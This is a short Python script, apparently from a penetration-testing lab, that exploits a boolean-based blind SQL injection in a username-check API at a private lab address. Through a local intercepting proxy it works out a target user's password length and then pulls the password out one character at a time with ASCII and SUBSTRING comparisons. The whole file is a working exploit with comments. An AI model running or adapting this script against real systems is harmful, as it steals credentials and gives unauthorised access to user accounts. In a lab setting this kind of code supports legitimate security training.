#!/usr/bin/python3

import requests
import json
import sys
from urllib.parse import quote_plus


# The user we are targeting
target = "maria"


# Proxy settings
proxy = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}


# Checks if query `q` evaluates as `true` or `false`
def oracle(q):
    p = quote_plus(f"{target}' AND ({q})-- -")
    r = requests.get(
        f"http://10.129.204.197/api/check-username.php?u={p}", proxies=proxy)
    j = json.loads(r.text)
    return j['status'] == 'taken'
    

# Get the target's password length
length = 0
# Loop until the value of `length` matches `LEN(password)`
while not oracle(f"LEN(password)={length}"):
    length += 1
print(f"[*] Password length = {length}")
    
    
# Dump the target's password
print("[*] Password = ", end='')
# Loop through all character indices in the password. SQL starts with 1, not 0
for i in range(1, length + 1):
   # Loop through all decimal values for printable ASCII characters (0x20-0x7E)
   for c in range(32,127):
        if oracle(f"ASCII(SUBSTRING(password,{i},1))={c}"):
            print(chr(c), end='')
            sys.stdout.flush()
print()